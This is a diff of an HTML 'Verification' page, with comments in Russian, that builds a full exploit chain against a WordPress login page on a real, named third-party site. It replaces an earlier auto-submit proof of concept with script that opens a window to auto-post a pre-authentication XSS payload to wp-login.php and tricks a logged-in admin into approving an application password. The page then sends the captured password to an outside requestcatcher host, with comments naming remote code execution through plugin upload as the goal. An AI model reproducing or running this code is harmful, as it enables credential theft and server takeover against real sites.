@@ -5,19 +5,59 @@
 <title>Verification</title>
 </head>
 <body>
-<!-- XSS2Shell trigger (CVE-2026-64638) — преаутентифицированный XSS в wp-login.php
-     Цепочка: parser-differential -> DOM injection -> auto-click user-profile.js -> JSONP eval
-     Для RCE нужен залогиненный админ: app-password -> REST -> publish -> plugin upload -->
-<form id="poc" method="post" action="https://www.creditlogement.fr/wp-login.php">
-  <input type="hidden" name="log"
-    value='< area id=ajaxurl href=/?rest_route=/&_method=GET&_jsonp=alert>< div id=color-picker class=reset-pass-submit>< button class="wp-generate-pw color-option">X'>
-  <input type="hidden" name="pwd" value="x">
-</form>
+<!-- XSS2Shell (CVE-2026-64638) — полная цепочка: preauth XSS -> app password -> RCE -->
 <script>
-// автосабмит через 1 сек
-setTimeout(function() {
-  document.getElementById('poc').submit();
-}, 1000);
+var HOOK = 'https://clhook1786763439.requestcatcher.com';
+var TARGET = 'https://www.creditlogement.fr';
+
+// ---- Этап 0: проверка — мы на success_url с app_password? ----
+function grabCreds() {
+  var all = location.search + location.hash;
+  if (all.indexOf('app_password') !== -1 || all.indexOf('password') !== -1) {
+    try {
+      fetch(HOOK + '/creds?' + encodeURIComponent(all), {mode: 'no-cors'});
+    } catch(e) {}
+    document.body.innerHTML = '<h2>Done</h2>';
+    return true;
+  }
+  return false;
+}
+
+if (!grabCreds()) {
+  // ---- Этап 1: main window -> authorize-application.php (success_url = мы же) ----
+  var succ = location.href.split('#')[0].split('?')[0] + '?capture=1';
+  var authUrl = TARGET + '/wp-admin/authorize-application.php?app_name=AuditVerif&success_url=' + encodeURIComponent(succ);
+  
+  // ---- Этап 2: открываем child (окно 2) — оно сделает POST в wp-login.php ----
+  var child = window.open('', '_blank');
+  
+  // main window переходит на authorize page
+  setTimeout(function() {
+    window.location.href = authUrl;
+  }, 300);
+  
+  // child: ждём, потом POST на wp-login.php с XSS-пейлоадом
+  setTimeout(function() {
+    if (!child || child.closed) { try { child = window.open('', '_blank'); } catch(e){} }
+    try {
+      var doc = child.document;
+      doc.open();
+      doc.write('<!doctype html><html><body><form id="f" method="POST" action="' + TARGET + '/wp-login.php">' +
+        '<input type="hidden" name="log" value="< area id=ajaxurl href=/?rest_route=/&_method=GET&_jsonp=window.opener.approve.click>< div id=color-picker class=reset-pass-submit>< button class=&quot;wp-generate-pw color-option&quot;>X">' +
+        '<input type="hidden" name="pwd" value="x">' +
+        '<input type="hidden" name="wp-submit" value="Log In">' +
+        '<input type="hidden" name="testcookie" value="1">' +
+        '</form><script>document.getElementById("f").submit();</' + 'script></body></html>');
+      doc.close();
+    } catch(e) {
+      // about:blank cross-origin issues — fallback: навигация
+      try { child.location = 'data:text/html,' + encodeURIComponent('<form id="f" method="POST" action="' + TARGET + '/wp-login.php"><input name="log" value="< area id=ajaxurl href=/?rest_route=/&_method=GET&_jsonp=window.opener.approve.click>< div id=color-picker class=reset-pass-submit>< button class=&quot;wp-generate-pw color-option&quot;>X"><input name="pwd" value="x"><input name="wp-submit" value="Log In"><input name="testcookie" value="1"></form><script>document.getElementById("f").submit();</' + 'script>'); } catch(e2) {}
+    }
+  }, 2500);
+  
+  // ---- Этап 3: после возврата на success_url (с паролем) — перехват ----
+  // (страница перезагрузится с ?capture=1 — grabCreds() сработает)
+}
 </script>
 </body>
 </html>
